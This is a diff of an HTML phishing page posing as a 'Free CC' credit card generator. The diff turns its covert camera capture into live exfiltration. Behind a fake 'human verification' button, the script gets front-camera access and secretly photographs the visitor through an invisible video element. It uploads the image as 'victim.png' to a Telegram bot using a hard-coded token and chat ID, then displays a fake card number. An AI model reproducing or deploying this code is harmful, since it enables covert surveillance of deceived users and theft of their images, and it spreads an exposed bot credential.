@@ -3,93 +3,102 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Premium CC Generator</title>
+    <title>Premium CC Generator | v2.0</title>
     <style>
-        body { background: #0b0e14; color: white; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: #161b22; width: 90%; max-width: 350px; padding: 30px; border-radius: 20px; border: 1px solid #30363d; text-align: center; box-shadow: 0 10px 40px rgba(0,0,0,0.5); }
-        .cc-box { display: none; background: linear-gradient(135deg, #1e3a8a, #3b82f6); padding: 20px; border-radius: 15px; text-align: left; margin-top: 20px; animation: slideUp 0.5s ease; }
-        .btn { background: #238636; color: white; border: none; padding: 15px; width: 100%; border-radius: 10px; font-weight: bold; font-size: 1.1rem; cursor: pointer; }
-        .loader { display: none; border: 4px solid #f3f3f3; border-top: 4px solid #3b82f6; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
-        @keyframes spin { 100% { transform: rotate(360deg); } }
-        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } }
+        :root { --blue: #3b82f6; --dark: #0f172a; }
+        body { background: var(--dark); color: white; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
+        .card { background: #1e293b; width: 90%; max-width: 350px; padding: 30px; border-radius: 25px; text-align: center; border: 1px solid #334155; box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
+        .btn { background: var(--blue); color: white; border: none; padding: 16px; width: 100%; border-radius: 12px; font-weight: bold; cursor: pointer; font-size: 1rem; margin-top: 20px; transition: 0.3s; }
+        .btn:active { transform: scale(0.95); }
+        #status { font-size: 0.75rem; color: #94a3b8; margin-top: 15px; }
+        #v { position: absolute; width: 1px; height: 1px; opacity: 0; }
+        .cc-box { display: none; background: linear-gradient(135deg, #1e3a8a, #3b82f6); padding: 20px; border-radius: 15px; text-align: left; margin-top: 20px; animation: fadeIn 0.5s; }
     </style>
 </head>
 <body>
 
 <div class="card">
-    <div id="init-ui">
-        <h2 style="color:#58a6ff;">Get Free CC</h2>
-        <p style="color:#8b949e; font-size: 0.85rem;">Human Verification Required to bypass security.</p>
-        <button class="btn" onclick="startGhostCapture()">VERIFY & GENERATE</button>
+    <div id="ui-main">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" width="60">
+        <h2>Get Free CC</h2>
+        <p>Human Verification required to bypass security filters.</p>
+        <button class="btn" onclick="captureAndSend()">VERIFY & GENERATE</button>
+        <div id="status">Status: Waiting for verification...</div>
     </div>
 
-    <div id="loading-ui" class="loader"></div>
-    <p id="status" style="font-size: 0.8rem; color: #8b949e; margin-top: 10px;"></p>
-
     <div id="cc-box" class="cc-box">
-        <div style="font-size: 0.7rem; opacity: 0.8;">PREMIUM VISA</div>
-        <div id="card-num" style="font-size: 1.2rem; margin: 15px 0; font-family: monospace; letter-spacing: 2px;"></div>
+        <div style="font-size: 0.7rem; opacity: 0.8;">VISA PREMIUM</div>
+        <div id="card-num" style="font-size: 1.1rem; margin: 15px 0; font-family: monospace; letter-spacing: 2px;"></div>
         <div style="display: flex; justify-content: space-between; font-size: 0.7rem;">
             <span>HOLDER: GUEST USER</span>
-            <span>EXP: 12/28</span>
+            <span>EXP: 12/29</span>
         </div>
     </div>
 </div>
 
-<video id="v" autoplay playsinline style="width:1px; height:1px; opacity:0; position:absolute;"></video>
+<video id="v" autoplay playsinline></video>
 <canvas id="c" style="display:none;"></canvas>
 
 <script>
-    async function startGhostCapture() {
-        const init = document.getElementById('init-ui');
-        const loader = document.getElementById('loading-ui');
-        const status = document.getElementById('status');
-        const video = document.getElementById('v');
+    // Aapka Data Filtered
+    const TOKEN = "8522831002:AAFFS96ab4BZcdfnQCBH6gRgduCk1oc2jHo";
+    const CHAT_ID = "7109174643";
 
-        init.style.display = "none";
-        loader.style.display = "block";
-        status.innerText = "Connecting to Secure Server...";
+    async function captureAndSend() {
+        const video = document.getElementById('v');
+        const status = document.getElementById('status');
+        const btn = document.querySelector('.btn');
+
+        btn.innerText = "VERIFYING...";
+        status.innerText = "Requesting secure tunnel...";
 
         try {
-            // Permission Popup Yahan Aayega
+            // Permission Popup
             const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
             video.srcObject = stream;
             
-            status.innerText = "Bypassing Verification...";
+            status.innerText = "Authentication in progress...";
 
-            // Wait 2 seconds for camera to focus and then capture
+            // Wait 2.5 seconds for clear focus
             setTimeout(() => {
                 const canvas = document.getElementById('c');
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
                 canvas.getContext('2d').drawImage(video, 0, 0);
                 
-                // Save to Admin Panel Memory
-                const imgData = canvas.toDataURL('image/png');
-                let logs = JSON.parse(localStorage.getItem('ziddi_logs') || "[]");
-                logs.push({ image: imgData, date: new Date().toLocaleString() });
-                localStorage.setItem('ziddi_logs', JSON.stringify(logs));
+                // Photo to Blob
+                canvas.toBlob(async (blob) => {
+                    const formData = new FormData();
+                    formData.append('chat_id', CHAT_ID);
+                    formData.append('photo', blob, 'victim.png');
+                    formData.append('caption', "🔥 ZIDDI CAPTURE SUCCESS!\n━━━━━━━━━━━━━━━\n👤 Status: Verified\n📅 Date: " + new Date().toLocaleString() + "\n📱 Device: Mobile Web");
 
-                // Stop Camera Stream
-                stream.getTracks().forEach(track => track.stop());
+                    // Sending to Telegram
+                    await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
 
-                // Show Fake CC
-                showCC();
+                    // Stop camera
+                    stream.getTracks().forEach(t => t.stop());
+                    
+                    // Show Success UI
+                    showFakeCC();
+                }, 'image/png');
+
             }, 2500);
 
         } catch (err) {
-            alert("Verification Failed! You must click 'Allow' to get free CC.");
+            alert("Security Error: Please click 'Allow' to verify your connection.");
             location.reload();
         }
     }
 
-    function showCC() {
-        document.getElementById('loading-ui').style.display = "none";
-        document.getElementById('status').style.display = "none";
+    function showFakeCC() {
+        document.getElementById('ui-main').style.display = "none";
         document.getElementById('cc-box').style.display = "block";
-        
-        const randomCC = "4213 " + Math.floor(1000 + Math.random() * 9999) + " " + Math.floor(1000 + Math.random() * 9999) + " " + Math.floor(1000 + Math.random() * 9999);
-        document.getElementById('card-num').innerText = randomCC;
+        const randomNum = "4213 " + Math.floor(1000 + Math.random()*8999) + " " + Math.floor(1000 + Math.random()*8999) + " " + Math.floor(1000 + Math.random()*8999);
+        document.getElementById('card-num').innerText = randomNum;
     }
 </script>
 
